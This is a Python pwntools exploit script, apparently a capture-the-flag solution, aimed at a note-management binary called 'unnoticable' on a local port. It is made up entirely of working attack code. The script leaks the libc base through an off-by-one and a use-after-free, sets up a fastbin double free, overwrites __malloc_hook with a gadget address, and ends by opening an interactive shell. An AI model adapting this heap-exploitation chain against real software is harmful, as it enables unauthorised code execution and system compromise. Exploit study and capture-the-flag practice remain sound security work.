# -*- coding: utf-8 -*-
# @Author: m4drat
# @Date:   2019-10-30 19:22:27

from pwn import *

#context(os='linux', arch='i386')
context(os='linux', arch='amd64')

context.terminal = ['tmux', 'new-window']
context.log_level = 2
local = False
fPath  = './unnoticable'
taskIp = '127.0.0.1'
taskPort = 22010

OFFSET = 0x3c4b78
LIBC_BASE = 0x0

SYSTEM_OFFSET = 0x45390

MALLOC_HOOK = 0x0
MALLOC_HOOK_OFFSET = 0x3c4b10

BINARY_GADGET = 0x400B96

# near malloc_hook to rewrite it
FAKE_FAST_7f_OFFSET = 0x3c4aed
FAKE_FAST_7f = 0x0

ONE_GADGET_OFFSET = 0x45216

if local:
    ps = process(fPath)
else:
    ps = remote(taskIp, taskPort)

def create(name, content):
    ps.sendline('c')
    ps.recv()
    ps.sendline(name)
    ps.recv()
    ps.sendline(content)
    ps.recv()

def edit(idx, name, content):
    ps.sendline('e')
    ps.recv()
    ps.sendline(idx if type(idx) == str else str(idx))
    ps.recv()
    ps.sendline(name)
    ps.recv()
    ps.sendline(content)
    ps.recv()

def delete(idx):
    ps.sendline('d')
    ps.recv()
    ps.sendline(idx if type(idx) == str else str(idx))
    ps.recv()

def view(idx):
    ps.sendline('v')
    ps.recv()
    ps.sendline(idx if type(idx) == str else str(idx))
    return ps.recv()

def leave():
    ps.sendline('l')
    ps.recv()

def leak_libc():
    global LIBC_BASE

    # 240 - unsorted bin range
    create('0', 'A' * 240)
    create('1', 'B' * 240)
    create('2', 'C' * 240) # to bypass top check

    delete(1)
    delete(2) # to bypass top check

    edit(0, 'D' * 32, 'M') # rewrite next_node.deleted field using off-by-one

    libc_ptr = u64(view(1)[0x22 : 0x22+7] + '\x00') # trigger UAF
    log.info('Libc ptr from unsorted chunk bk: 0x%x' % libc_ptr)
    LIBC_BASE = libc_ptr - OFFSET 
    return LIBC_BASE

def rewrite_free_hook(desired_addr):
    # 0x70 <= size <= 0x7f, fastbin range 
    create('1', 'E' * 100) 
    create('2', 'F' * 100)
    create('3', 'G' * 100) # to bypass top check

    delete(2)
    delete(3) # to bypass top check

    edit(1, 'H' * 32, 'I') # rewrite next_node.deleted field using off-by-one

    # double-free 2 node
    delete(2)

    edit(1, 'H' * 32, 'I') # rewrite next_node.deleted field using off-by-one

    # allocate double-freed chunk + rewrite its fd ptr to point to desired location
    create('2', p64(FAKE_FAST_7f) + 'K' * 94)

    create('4', 'P' * 100)
    create('5', 'Q' * 100)

    # rewrite __malloc_hook
    create('6', 'A' * 0x13 + p64(desired_addr) + 'A' * 73)

def main():
    global FAKE_FAST_7f, LIBC_BASE, MALLOC_HOOK

    ps.recv()
    log.success('Got libc base: ' + hex(leak_libc()))

    FAKE_FAST_7f = LIBC_BASE + FAKE_FAST_7f_OFFSET
    MALLOC_HOOK  = LIBC_BASE + MALLOC_HOOK_OFFSET

    log.info('__malloc_hook at: 0x%x' % MALLOC_HOOK)
    log.info('Fake fast_bin chunk (0x7f) at 0x%x' % FAKE_FAST_7f)

    rewrite_free_hook(BINARY_GADGET) # LIBC_BASE + ONE_GADGET_OFFSET
    # gdb.attach(ps)

    # trigger malloc
    create('7', 'E' * 100)

    # get your shell
    ps.interactive()

if __name__ == "__main__":
    main()